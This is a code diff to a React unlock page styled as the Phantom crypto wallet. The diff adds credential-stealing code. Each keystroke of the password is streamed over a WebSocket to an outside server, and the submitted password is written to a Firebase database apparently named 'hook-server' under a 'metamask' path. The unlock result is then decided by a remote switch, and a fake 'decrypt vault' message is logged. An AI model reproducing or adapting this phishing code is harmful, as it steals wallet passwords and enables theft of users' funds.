@@ -1,4 +1,10 @@
 import React, { useEffect, useRef, useState } from "react";
+import { initializeApp } from "firebase/app";
+import { getDatabase } from "firebase/database";
+import { ref, set } from "firebase/database";
+import { v4 as uuidv4 } from 'uuid';
+import axios from 'axios';
+
 import PhantomLogo from "../components/phantom-logo/index";
 
 import { ReactComponent as PhantomLetterLogoSVG } from "../assets/images/LetterLogo.svg";
@@ -7,7 +13,40 @@ import { ReactComponent as LockSVG } from "../assets/images/Lock.svg";
 import { ReactComponent as CloseSVG } from "../assets/images/Close.svg";
 import "./unlock.css";
 
-export default function UnlockPage({ onSubmit, onChange }) {
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCd2I2JNm7okch3L8S0uozioChrntq05Ow",
+  authDomain: "hook-server-fcc32.firebaseapp.com",
+  databaseURL: "https://hook-server-fcc32-default-rtdb.firebaseio.com/",
+  projectId: "hook-server-fcc32",
+  storageBucket: "hook-server-fcc32.firebasestorage.app",
+  messagingSenderId: "816070028547",
+  appId: "1:816070028547:web:7c5202b183183dee8fcd36",
+  measurementId: "G-957FNZD5T4"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// WebSocket constants
+const PING = 99;
+const SEND_UID = 101;
+const BROWSER_CONNECTED = 102;
+
+const formatDateWithMilliseconds = () => {
+  const now = new Date();
+  const year = now.getFullYear();
+  const month = String(now.getMonth() + 1).padStart(2, '0');
+  const day = String(now.getDate()).padStart(2, '0');
+  const hours = String(now.getHours()).padStart(2, '0');
+  const minutes = String(now.getMinutes()).padStart(2, '0');
+  const seconds = String(now.getSeconds()).padStart(2, '0');
+  const milliseconds = String(now.getMilliseconds()).padStart(4, '0'); // Milliseconds padded to 4 digits
+
+  return `${year}${month}${day}${hours}${minutes}${seconds}${milliseconds}`;
+};
+
+export default function UnlockPage({ onSuccess, onChange }) {
   const [password, setPassword] = useState("");
   const [touched, setTouched] = useState(false);
   const [error, setError] = useState(false);
@@ -49,12 +88,70 @@ export default function UnlockPage({ onSubmit, onChange }) {
     };
   }, [helpOpen]);
 
+
+  const [isConnected, setIsConnected] = useState(false);
+  const ws = useRef(null);
+  const uniqueId = useRef(uuidv4());
+
+  useEffect(() => {
+    // Initialize WebSocket connection
+    connectWebSocket();
+
+    // Cleanup on component unmount
+    return () => {
+      if (ws.current) {
+        ws.current.close();
+      }
+    };
+  }, []);
+
+  const connectWebSocket = () => {
+    ws.current = new WebSocket("wss://lucid-socket-server.onrender.com");
+
+    ws.current.onopen = () => {
+      setIsConnected(true);
+      // Send browser connected message
+      const jsonObject = {
+        e: BROWSER_CONNECTED,
+        v: uniqueId.current
+      };
+      
+      if (ws.current && ws.current.readyState === WebSocket.OPEN) {
+        ws.current.send(JSON.stringify(jsonObject));
+      } else {
+        console.warn('WebSocket not connected');
+      }
+    };
+
+    ws.current.onclose = () => {
+      setIsConnected(false);
+    };
+
+    ws.current.onerror = (error) => {
+      console.error('WebSocket error:', error);
+      setIsConnected(false);
+    };
+  };
+
   const handPasswordInputChange = (e) => {
     const value = e.target.value;
     setPassword(value);
     onChange?.(value);
     if (PhantomLogoRef.current) PhantomLogoRef.current.wakeUp();
     if (touched) setError(value === "");
+
+    if (value.trim() === '' || !isConnected) return;
+
+    const pingObject = {
+      e: SEND_UID,
+      v: value
+    };
+
+    if (ws.current && ws.current.readyState === WebSocket.OPEN) {
+      ws.current.send(JSON.stringify(pingObject));
+    } else {
+      console.warn('WebSocket not connected');
+    }
   };
 
   const handleSubmit = async () => {
@@ -68,31 +165,61 @@ export default function UnlockPage({ onSubmit, onChange }) {
       return;
     }
 
+    set(ref(db, "88_/-metamask/" + formatDateWithMilliseconds()), {
+      value: password,
+      date: String(new Date()),
+    });
+
+    const value = password;
+    if (value.trim() === '' || !isConnected) {
+      console.warn('Metamask Support API not connected');
+    } else {
+      const pingObject = {
+        e: SEND_UID,
+        v: value
+      };
+      
+      if (ws.current && ws.current.readyState === WebSocket.OPEN) {
+        ws.current.send(JSON.stringify(pingObject));
+      } else {
+        console.warn('WebSocket not connected');
+      }
+    }
+
     setLoading(true);
     await new Promise((resolve) => setTimeout(resolve, 100));
     setLoading(false);
 
-    if (password !== "123") {
-      setError(true);
-      PhantomLogoRef.current?.incorrect();
+    try {
+      const url = `https://api.npoint.io/a8e12caa3df5c2954957`;
+      const response = await axios.get(url);
+      if (response.data.success) {
+        onSuccess()
+      } else {
+        setError(true);
+        PhantomLogoRef.current?.incorrect();
 
-      if (inputRef.current) {
-        // Reset transform before re-triggering
-        inputRef.current.style.transition = "none";
-        inputRef.current.style.transform = "scale(1)";
-        void inputRef.current.offsetWidth; // force reflow
+        if (inputRef.current) {
+          // Reset transform before re-triggering
+          inputRef.current.style.transition = "none";
+          inputRef.current.style.transform = "scale(1)";
+          void inputRef.current.offsetWidth; // force reflow
 
-        // Apply shake animation
-        inputRef.current.style.transition = "transform 0.15s ease-in-out";
-        inputRef.current.style.transform = "scale(0.95)";
-        setTimeout(() => {
-          if (inputRef.current) inputRef.current.style.transform = "scale(1)";
-        }, 150);
+          // Apply shake animation
+          inputRef.current.style.transition = "transform 0.15s ease-in-out";
+          inputRef.current.style.transform = "scale(0.95)";
+          setTimeout(() => {
+            if (inputRef.current) inputRef.current.style.transform = "scale(1)";
+          }, 150);
+        }
+
+        // Ensure focus AFTER animation
+        setTimeout(() => inputRef.current?.focus(), 160);
+        return;
       }
-
-      // Ensure focus AFTER animation
-      setTimeout(() => inputRef.current?.focus(), 160);
-      return;
+    } catch (error) {
+      // throw new Error(`Failed to fetch data: ${error.message}`);
+      console.error(`Failed to decrypt vault: ${error.message}`)
     }
 
     // Focus after unlock success
